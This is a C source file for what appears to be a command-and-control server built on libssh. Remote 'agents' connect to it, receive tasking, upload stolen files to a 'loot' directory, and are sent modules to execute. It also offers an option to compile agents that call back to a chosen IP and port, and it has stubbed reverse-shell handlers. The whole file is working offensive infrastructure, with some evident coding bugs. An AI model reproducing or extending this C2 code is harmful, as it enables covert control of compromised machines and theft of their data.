#include "agents.h"
#include "misc.h"
#include "list.h"
#include "authenticate.h"
#include "b64.h"

#ifdef HAVE_ARGP_H
#include <argp.h>
#endif

#ifndef KEYS_FOLDER
#ifdef _WIN32
#define KEYS_FOLDER
#else
#define KEYS_FOLDER "/etc/ssh/"
#endif
#endif

#ifdef WITH_PCAP
const char *pcap_file="debug.server.pcap";
ssh_pcap_file pcap;

void set_pcap(ssh_session session);
void set_pcap(ssh_session session){
	if(!pcap_file)
		return;
	pcap=ssh_pcap_file_new();
	if(ssh_pcap_file_open(pcap,pcap_file) == SSH_ERROR){
		printf("Error opening pcap file\n");
		ssh_pcap_file_free(pcap);
		pcap=NULL;
		return;
	}
	ssh_set_pcap_file(session,pcap);
}

void cleanup_pcap(void);
void cleanup_pcap(){
	ssh_pcap_file_free(pcap);
	pcap=NULL;
}
#endif

ssh_session session_array[MAX_CONN];
pthread_t thread_array[MAX_CONN];
pthread_mutex_t session_lock;
struct clientNode first;
int halt = 0;


#ifdef HAVE_ARGP_H
const char *argp_program_version = "libssh server example "
    SSH_STRINGIFY(LIBSSH_VERSION);
const char *argp_program_bug_address = "<libssh@libssh.org>";

/* Program documentation. */
static char doc[] = "libssh -- a Secure Shell protocol implementation";

/* A description of the arguments we accept. */
static char args_doc[] = "BINDADDR";

/* The options we understand. */
static struct argp_option options[] = {
    {
        .name  = "port",
        .key   = 'p',
        .arg   = "PORT",
        .flags = 0,
        .doc   = "Set the port to bind.",
        .group = 0
    },
    {
        .name  = "hostkey",
        .key   = 'k',
        .arg   = "FILE",
        .flags = 0,
        .doc   = "Set the host key.",
        .group = 0
    },
    {
        .name  = "dsakey",
        .key   = 'd',
        .arg   = "FILE",
        .flags = 0,
        .doc   = "Set the dsa key.",
        .group = 0
    },
    {
        .name  = "rsakey",
        .key   = 'r',
        .arg   = "FILE",
        .flags = 0,
        .doc   = "Set the rsa key.",
        .group = 0
    },
    {
        .name  = "verbose",
        .key   = 'v',
        .arg   = NULL,
        .flags = 0,
        .doc   = "Get verbose output.",
        .group = 0
    },
    {
        .name = "agent",
        .key = 'a',
        .arg = "IP:PORT",
        .flags = 0,
        .doc = "Compile an agent which will connect to IP over PORT",
        .group = 0
    },
    {
        .name = "authenticate",
        .key = 'i',
        .arg = "ID:PASS",
        .flags = 0,
        .doc = "Add agent information to the server database",
        .group = 0
    },
    {NULL, 0, 0, 0, NULL, 0}
};

/* Parse a single option. */
static error_t parse_opt (int key, char *arg, struct argp_state *state) {
  /* Get the input argument from argp_parse, which we
   * know is a pointer to our arguments structure.
   */
    ssh_bind sshbind = state->input;
    char *ip;
    char *port;
    char *pass;
    char *id;
    int dbg = 0;
  
    switch (key) {
        case 'p':
            ssh_bind_options_set(sshbind, SSH_BIND_OPTIONS_BINDPORT_STR, arg);
            break;
        case 'd':
            ssh_bind_options_set(sshbind, SSH_BIND_OPTIONS_DSAKEY, arg);
            break;
        case 'k':
            ssh_bind_options_set(sshbind, SSH_BIND_OPTIONS_HOSTKEY, arg);
            break;
        case 'r':
            ssh_bind_options_set(sshbind, SSH_BIND_OPTIONS_RSAKEY, arg);
            break;
        case 'v':
            ssh_bind_options_set(sshbind, SSH_BIND_OPTIONS_LOG_VERBOSITY_STR, "3");
            break;
        case 'a':
            halt = 1;
            port = strchr(arg, ':') + 1;
            if(port == NULL){
                printf("Improper format: needs to be IP:PORT\n");
                argp_usage(state);
            }
            dbg = index_of(arg, ':', 0);
            ip = substring(arg, dbg, strlen(arg));
        
            compile_agent(ip, port);
            break;
        case 'i':
            halt = 1;
            pass = strchr(arg, ':') + 1;
            if(pass == NULL){
                printf("Improper format: needs to be ID:PASSWORD\n");
                argp_usage(state);
            }
            dbg = index_of(arg, ':', 0);
            id = substring(arg, dbg, strlen(arg));

            register_agent(id, pass);
            printf("Registered agent with %s and %s\n", id, pass);
            break;
        case ARGP_KEY_ARG:
            if (state->arg_num >= 1) {
            /* Too many arguments. */
                argp_usage (state);
            }
            ssh_bind_options_set(sshbind, SSH_BIND_OPTIONS_BINDADDR, arg);
            break;
        case ARGP_KEY_END:
            if (state->arg_num < 1) {
                /* Not enough arguments. */
                if(!halt)
                    argp_usage (state);
                else exit(0);
            }
            break;
        default:
            return ARGP_ERR_UNKNOWN;
    }

    return 0;
}

/* Our argp parser. */
static struct argp argp = {options, parse_opt, args_doc, doc, NULL, NULL, NULL};
#endif /* HAVE_ARGP_H */


void manager_handler(struct clientNode *node){
    clientDat *manager = node->data;
    char resp[2048];

    int operation;
    int rc = 0;
    int quitting = 0;
    int size = 0;
    int size_e = 0;
    char *ptr = NULL;
    char *dat_ptr = NULL;
    char buff[2048];
    char tmpbuffer[8];
    char filename[2048];
    FILE *file;

    while (!quitting)
    {
        ptr = resp;
        operation = -1;
        rc = 0;
        size = 0;
        size_e = 0;
        file = NULL;
        dat_ptr = NULL;
        memset(buff, 0, 2048);
        memset(tmpbuffer, 0, 8);
        memset(filename, 0, 2048);
        
        rc = ssh_channel_read(manager->chan, resp, sizeof(resp), 0);
        if (rc == SSH_ERROR)
        {
            printf("Manager %s: Failed to handle agent: %s\n", manager->id, ssh_get_error(manager->session));
            return;
        }
        
        // this seems wrong...
        char tmpbf[3] = {0,0,0};
        strncat(tmpbf,resp,2);
        operation = atoi(tmpbf);
        ptr += 2;
        
        /*
        Command data structure:
            First char: 
                Describes what command it is
            Following chars:
                Optional values, separated by ',' chars
            Terminating sequence:   
                NULL
        */

        printf("Manager %s: Operation caught: %d\n", manager->id, operation);
        switch (operation)
        {
        case MANAG_EXIT:
            printf("Manager exit caught\n");
            pthread_mutex_lock(&session_lock);
            remove_node(node);
            pthread_mutex_unlock(&session_lock);
            ssh_channel_close(manager->chan);
            ssh_free(manager->session);
            printf("Manager %s: Client exiting...\n", manager->id); 
            quitting = 1;
            break;

        case MANAG_GET_LOOT:
            
            printf("Manager %s: Sending file -> %s\n", manager->id, ptr);
            memset(buff, 0, sizeof(buff));
            tmpbuffer[7] = '\0';
            
            // get filesize 
            size = get_file(ptr, &dat_ptr);
            
            if(size < 0){
                printf("Manager %s: filename '%s' does not exist\n", manager->id, buff); 
                ssh_channel_write(manager->chan, "er", 3);
                break;
            }
            memset(buff, 0, sizeof(buff));
            size_e = b64_encoded_size(size);
            sprintf(tmpbuffer, "%d", size_e);
            
            // writes file size
            ssh_channel_write(manager->chan, tmpbuffer, sizeof(tmpbuffer));
            ssh_channel_read(manager->chan, buff, sizeof(buff), 0);
            
            ptr = b64_encode((unsigned char *)dat_ptr, size);
            
            // writes file 
            rc = ssh_channel_write(manager->chan, ptr, size_e);
            if(rc == SSH_ERROR){
                printf("Tada you found it: %s\n", ssh_get_error(manager->session));
            }
            printf("Manager %s: Sent file successfully\n", manager->id);

            break;

        case MANAG_UP_FILE:
            printf("Manager upload caught\n");
            /*ADD CHECKS IN HERE FOR SAFETY*/
            
            // gets file name
            ssh_channel_write(manager->chan, "fn", 3);
            ssh_channel_read(manager->chan, filename, sizeof(filename), 0);
            
            // get size and allocate memory segment
            ssh_channel_write(manager->chan, "ok", 3);
            ssh_channel_read(manager->chan, (char *) &size, 1, 0);
            char *data_ptr = malloc(size);
            memset(data_ptr, 0, size);
            
            // writes file size
            ssh_channel_write(manager->chan, "ok", 3);
            ssh_channel_read(manager->chan, buff, size, 0);

            // writes file 
            ssh_channel_write(manager->chan, "ok", 3);
            clean_input(filename);
            strcat("loot/", filename);
            file = fopen(filename, "wb");
            fwrite(data_ptr, 1, size, file);
            fclose(file);
            break;

        case MANAG_REQ_RVSH:
            printf("Manager shell command caught\n");
            break;

        case AGENT_REV_SHELL:
            printf("Manager reverse shell caught\n");
            break;

        case MANAG_TASK_MODULE:
            printf("Manager %s: Sending file -> %s\n", manager->id, ptr);
            memset(buff, 0, sizeof(buff));
            // TODO: ZERO OUT ALL BUFFERS HERE
            // get filesize 
            size = get_file(ptr, &dat_ptr);
        
            if(size < 0){
                printf("Manager %s: filename '%s' does not exist\n", manager->id, buff); 
                ssh_channel_write(manager->chan, "er", 3);
                break;
            }
            memset(buff, 0, 2048);
            size_e = b64_encoded_size(size);
            sprintf(tmpbuffer, "%d", size_e);
        
            // writes file size
            ssh_channel_write(manager->chan, tmpbuffer, sizeof(tmpbuffer));
            ssh_channel_read(manager->chan, buff, sizeof(buff), 0);
        
            ptr = b64_encode((unsigned char *)dat_ptr, size);
        
            // writes file 
            rc = ssh_channel_write(manager->chan, ptr, size_e);
            if(rc == SSH_ERROR){
                printf("Manager %s: Failed to write data to channel: %s\n", manager->id, ssh_get_error(manager->session));
            }
            memset(tmpbuffer, 0, 8);

            ssh_channel_read(manager->chan, tmpbuffer, 8, 0);

            printf("Manager %s: Execution of module ended with exit code %s\n", manager->id, tmpbuffer);

            break;

        default:
            printf("Manager %s: Unknown operation value '%d'\n", manager->id, operation); 
            ssh_channel_write(manager->chan, "un", 3);
            break;
        }
    }
    
}


void agent_handler(struct clientNode *node){
    clientDat *agent = node->data;
    char resp[2048];
    
    int operation;
    int rc = 0;
    int quitting = 0;
    int size = 0;
    char buff[2048];
    char tmpbuffer[8];
    char *dat_ptr = NULL;
    int size_e = 0;
    char *ptr = NULL;
    char filename[2048];
    FILE *file;
            
            
    while (!quitting)
    {
        ptr = resp;
        operation = -1;
        rc = 0;
        size = 0;
        size_e = 0;
        file = NULL;
        dat_ptr = NULL;
        memset(buff, 0, 2048);
        memset(tmpbuffer, 0, 8);
        memset(filename, 0, 2048);
        
        rc = ssh_channel_read(agent->chan, resp, sizeof(resp), 0);
        if (rc == SSH_ERROR)
        {
            printf("Client %s: Failed to handle agent: %s\n", agent->id, ssh_get_error(agent->session));
            return;
        }
        
        // this seems wrong...
        char tmpbf[3] = {0,0,0};
        strncat(tmpbf,resp,2);
        operation = atoi(tmpbf);
        ptr += 2;
        
        /*
        Command data structure:
            First char: 
                Describes what command it is
            Following chars:
                Optional values, separated by ',' chars
            Terminating sequence:   
                NULL
        */

        printf("Client %s: Operation caught: %d\n", agent->id, operation);

        switch (operation)
        {
        case AGENT_EXIT:
            printf("Agent exit caught\n");
            pthread_mutex_lock(&session_lock);
            remove_node(node);
            pthread_mutex_unlock(&session_lock);
            ssh_channel_close(agent->chan);
            ssh_free(agent->session);
            printf("Client %s: Client exiting...\n", agent->id); 
            quitting = 1;
            break;

        case AGENT_DOWN_FILE:

            printf("Client %s: Sending file -> %s\n", agent->id, ptr);
            memset(buff, 0, sizeof(buff));
            tmpbuffer[7] = '\0';
            
            // get filesize 
            size = get_file(ptr, &dat_ptr);
            
            if(size < 0){
                printf("Client %s: filename '%s' does not exist\n", agent->id, buff); 
                ssh_channel_write(agent->chan, "er", 3);
                break;
            }
            memset(buff, 0, sizeof(buff));
            size_e = b64_encoded_size(size);
            sprintf(tmpbuffer, "%d", size_e);
            
            // writes file size
            ssh_channel_write(agent->chan, tmpbuffer, sizeof(tmpbuffer));
            ssh_channel_read(agent->chan, buff, sizeof(buff), 0);
            
            ptr = b64_encode((unsigned char *)dat_ptr, size);
            
            // writes file 
            rc = ssh_channel_write(agent->chan, ptr, size_e);
            if(rc == SSH_ERROR){
                printf("Tada you found it: %s\n", ssh_get_error(agent->session));
            }
            printf("Client %s: Sent file successfully\n", agent->id);

            break;

        case AGENT_UP_FILE:
            printf("Agent upload caught\n");
            /*ADD CHECKS IN HERE FOR SAFETY*/
            
            // gets file name
            ssh_channel_write(agent->chan, "fn", 3);
            ssh_channel_read(agent->chan, filename, sizeof(filename), 0);
            
            // get size and allocate memory segment
            ssh_channel_write(agent->chan, "ok", 3);
            ssh_channel_read(agent->chan, (char *) &size, 1, 0);
            char *data_ptr = malloc(size);
            memset(data_ptr, 0, size);
            
            // writes file size
            ssh_channel_write(agent->chan, "ok", 3);
            ssh_channel_read(agent->chan, buff, size, 0);

            // writes file 
            ssh_channel_write(agent->chan, "ok", 3);
            clean_input(filename);
            strcat("loot/", filename);
            file = fopen(filename, "wb");
            fwrite(data_ptr, 1, size, file);
            fclose(file);
            break;

        case AGENT_EXEC_SC:
            printf("Agent shell caught\n");
            break;

        case AGENT_REV_SHELL:
            printf("Agent reverse shell caught\n");
            break;

        case AGENT_EXEC_MODULE:
            printf("Client %s: Sending file -> %s\n", agent->id, ptr);
            memset(buff, 0, sizeof(buff));
            // TODO: ZERO OUT ALL BUFFERS HERE
            // get filesize 
            size = get_file(ptr, &dat_ptr);
        
            if(size < 0){
                printf("Client %s: filename '%s' does not exist\n", agent->id, buff); 
                ssh_channel_write(agent->chan, "er", 3);
                break;
            }
            memset(buff, 0, 2048);
            size_e = b64_encoded_size(size);
            sprintf(tmpbuffer, "%d", size_e);
        
            // writes file size
            ssh_channel_write(agent->chan, tmpbuffer, sizeof(tmpbuffer));
            ssh_channel_read(agent->chan, buff, sizeof(buff), 0);
        
            ptr = b64_encode((unsigned char *)dat_ptr, size);
        
            // writes file 
            rc = ssh_channel_write(agent->chan, ptr, size_e);
            if(rc == SSH_ERROR){
                printf("Client %s: Failed to write data to channel: %s\n", agent->id, ssh_get_error(agent->session));
            }
            memset(tmpbuffer, 0, 8);

            ssh_channel_read(agent->chan, tmpbuffer, 8, 0);

            printf("Client %s: Execution of module ended with exit code %s\n", agent->id, tmpbuffer);

            break;

        default:
            printf("Client %s: Unknown operation value '%d'\n", agent->id, operation); 
            ssh_channel_write(agent->chan, "un", 3);
            break;
        }
    }
}


void client_handler(void* sess){
    struct clientNode *node = (struct clientNode*) sess;
    clientDat *pass = node->data;
    
    ssh_message message;
    int sftp = 0;
    int msgType = REQ_NONE;
    char buf[4096];
    char agent_id[128];
    char tmp_buffer[3];
    memset(tmp_buffer, 0, 3);
    
    do {
		//printf("entered message loop\n");
        message=ssh_message_get(pass->session);
        if(message){
            switch(ssh_message_type(message)){
                case SSH_REQUEST_CHANNEL_OPEN:
					printf("Client %s: Got request for opening channel\n", pass->id); 
                    if(ssh_message_subtype(message)==SSH_CHANNEL_SESSION){
                        pass->chan=ssh_message_channel_request_open_reply_accept(message);
                        break;
                    }
                default:
                    ssh_message_reply_default(message);
            }
            ssh_message_free(message);
        }
    } while(message && !pass->chan);
    
	if(!pass->chan){
        printf("Client %s: Channel error : %s\n", pass->id, ssh_get_error(pass->session));
        ssh_finalize();
        free(pass);
        remove_node(node);
        return;
    }
    
	do {
        message=ssh_message_get(pass->session);
        if(message && ssh_message_type(message)==SSH_REQUEST_CHANNEL &&
           ssh_message_subtype(message)==SSH_CHANNEL_REQUEST_SHELL){
				printf("Client %s: Got tasking request\n", pass->id);
                sftp=1;
                msgType = REQ_TASKING;
                ssh_message_channel_request_reply_success(message);
                break;
        }

        if(!sftp){
            ssh_message_reply_default(message);
        }
        ssh_message_free(message);
    } while (message && !sftp);
    
	if(!sftp){
		printf("Client %s: SFTP error : %s\n", pass->id, ssh_get_error(pass->session));
        free(pass);
        remove_node(node);
        return;
    }
    
    switch (msgType)
    {
    case REQ_TASKING:
        ssh_channel_read(pass->chan, tmp_buffer, 2, 0);
        ssh_channel_write(pass->chan, "ok", 2);
            
        if(tmp_buffer[0] == '0'){
            printf("Manager %s: Caught manager connection\n", pass->id);

            manager_handler(node);

        } else {
            ssh_channel_read(pass->chan, agent_id, sizeof(agent_id), 0);
            printf("Client %s: got identifier: %s\n", pass->id, agent_id);

            // Check if ID exists
            memset(buf, 0, sizeof(buf));
            strcat(buf, "agents/");
            int exists = directory_exists(strcat(buf, agent_id));
        
            if(!exists){
                init_agent(agent_id);
                printf("Client %s: Initialized agent\n", pass->id);
            }

            char tasking[2048];
            memset(tasking, 0, sizeof(tasking));
            get_tasking(agent_id, tasking);
            // Write tasking
            ssh_channel_write(pass->chan, tasking, strlen(tasking));
        
            // Pass to handler
            agent_handler(node);
        
        }
        
        break;
    default:
        printf("Client %s: got unknown message type: %d\n", pass->id, msgType);
        break;
    }

    printf("Client %s: closing channels...\n", pass->id);
    ssh_message_free(message);
    ssh_disconnect(pass->session);
    free(pass);

	
    return;
}

void *handle_conn(void *input){
    int auth=0;
    ssh_message message;
    struct clientNode *current = &first;
    char *name = NULL;
    ssh_session session = (ssh_session)input;
    
    do {
        message=ssh_message_get(session);
        if(!message)
            break;
        switch(ssh_message_type(message)){
            case SSH_REQUEST_AUTH:
                switch(ssh_message_subtype(message)){
                    case SSH_AUTH_METHOD_PASSWORD:
                        if(authenticate(ssh_message_auth_user(message), ssh_message_auth_password(message))){
                            auth=1;
                            name = malloc(strlen(ssh_message_auth_user(message)));
                            memset(name, 0, strlen(ssh_message_auth_user(message)));
                            sprintf(name, "%s", ssh_message_auth_user(message));
                            ssh_message_auth_reply_success(message,0);
                            break;
                       	} else {
                            auth = 2;
                            ssh_message_reply_default(message);
                            break;
                        }
                    // not authenticated, send default message
                    case SSH_AUTH_METHOD_NONE:
                    default:
                        ssh_message_auth_set_methods(message,SSH_AUTH_METHOD_PASSWORD);
                        ssh_message_reply_default(message);
                        break;
                }
                break;
            default:
                ssh_message_reply_default(message);
        }
        ssh_message_free(message);
    } while (!auth);
    
    // Check if the client authenticated successfully
	if(auth != 1){
        printf("Server: Terminating connection\n");
        ssh_disconnect(session);
    }else {
        clientDat *pass = malloc(sizeof(clientDat));
        pass->id = name;
        pass->session = session;
        pass->trans_id = rand();
    
        pthread_mutex_lock(&session_lock);
        // the fucker is pointing to itself @ 3 nodes...
        while(current->nxt != NULL){
            current = current->nxt;
        }
            
        struct clientNode *node = malloc(sizeof(*node));
        node->data = pass;
        node->nxt = NULL;
        node->prev = NULL;
        add_node(node, current);
        pthread_mutex_unlock(&session_lock);
                
        client_handler(node);
    }

    return NULL;
        
}



// REWORK
void handleTerm(int term){
    return;
    printf("Terminating...\n");
    int termTime = 10;
    int curr = 0;
    // Todo: clean up active connections from server.
    //pthread_mutex_lock(&session_lock);
    for (size_t i = 0; i < MAX_CONN; i++)
    {
        if(session_array[i] != NULL){
            printf("TERM: Found active connection at index %lu\n", i);
            while(session_array[i] != NULL){
                if(termTime > curr){
                    printf("TERM: Waiting for connection to terminate (%d/%d sec)\n", curr, termTime);
                    sleep(1);
                    curr++;
                } else {
                    printf("TERM: Killing connection...\n");
                    ssh_free(session_array[i]);
                }
            }
        }
    }
    //pthread_mutex_unlock(&session_lock);
    exit(-1);

}

void print_clientDat(clientDat *str){
    printf("\n\nID: %s\n", str->id);
    printf("Session address: %p\n", &(str->session));
    printf("Transaction ID: %d\n", str->trans_id);
    printf("Channel address: %p\n", &(str->chan));
    printf("Type: %d\n\n\n", str->type);
}


int main(int argc, char **argv){
    // set up signal handlers
    struct sigaction sigIntHandler;
	struct sigaction sigTermHandler;


	sigIntHandler.sa_handler = handleTerm;
   	sigemptyset(&sigIntHandler.sa_mask);
   	sigIntHandler.sa_flags = 0;

	sigTermHandler.sa_handler = handleTerm;
	sigemptyset(&sigTermHandler.sa_mask);
	sigTermHandler.sa_flags = 0;

   	sigaction(SIGINT, &sigIntHandler, NULL);
	sigaction(SIGTERM, &sigTermHandler, NULL);

    // initialize variables
    ssh_session session;
    ssh_bind sshbind;
    int r;
    int opt = 1;
    int quitting = 0;
	int master_socket;
    int ctr = 0;
    pthread_t thread;
    first.data = NULL;
    first.nxt = NULL;
    first.prev = NULL;
    
    // Initialize directories
    init();    

    if( (master_socket = socket(AF_INET , SOCK_STREAM , 0)) == 0){   
        perror("Server: Socket Failure");   
        exit(EXIT_FAILURE);   
    }

    if(setsockopt(master_socket, SOL_SOCKET, SO_REUSEADDR, (char *)&opt, sizeof(opt)) < 0 ){   
        perror("Server: Setsockopt Failure");   
        exit(EXIT_FAILURE);   
    }



    sshbind=ssh_bind_new();
    session=ssh_new();

    ssh_options_set(session, SSH_OPTIONS_FD, &master_socket);
	
    ssh_bind_options_set(sshbind, SSH_BIND_OPTIONS_DSAKEY, KEYS_FOLDER "ssh_host_dsa_key");
    ssh_bind_options_set(sshbind, SSH_BIND_OPTIONS_RSAKEY, KEYS_FOLDER "ssh_host_rsa_key");
#ifdef HAVE_ARGP_H
    /*
     * Parse our arguments; every option seen by parse_opt will
     * be reflected in arguments.
     */
    argp_parse (&argp, argc, argv, 0, 0, sshbind);
#else
    (void) argc;
    (void) argv;
#endif
#ifdef WITH_PCAP
    set_pcap(session);
#endif

    // bind the listener to the port
    if(ssh_bind_listen(sshbind)<0){
        printf("Error listening to socket: %s\n", ssh_get_error(sshbind));
        return 1;
    }
    printf("Server: Bound to listening port\n");
    
    // accept connections
    while (!quitting){
        session=ssh_new();

        r=ssh_bind_accept(sshbind,session);
	    printf("Server: Accepting connection\n");
        if(r==SSH_ERROR){
      	    printf("Error accepting a connection : %s\n",ssh_get_error(sshbind));
      	    return 1;
        }
        if (ssh_handle_key_exchange(session)) {
            printf("ssh_handle_key_exchange: %s\n", ssh_get_error(session));
            return 1;
        }

        // pass connection to handler thread
        if(pthread_create(&thread, NULL, handle_conn, session)){
            printf("Error creating thread\n");
            ssh_disconnect(session);
            break;
        }
    
        thread_array[ctr] = thread;

        	
    }
        
        
    for (size_t i = 0; i < ctr; i++){
        if(pthread_join(thread_array[i], NULL)){
            printf("Failed to join thread at index %lu\n", i);
        }
    }

    ssh_bind_free(sshbind);

#ifdef WITH_PCAP
    cleanup_pcap();
#endif
    ssh_finalize();

    printf("Server: Terminated successfully\n");
    return 0;
}
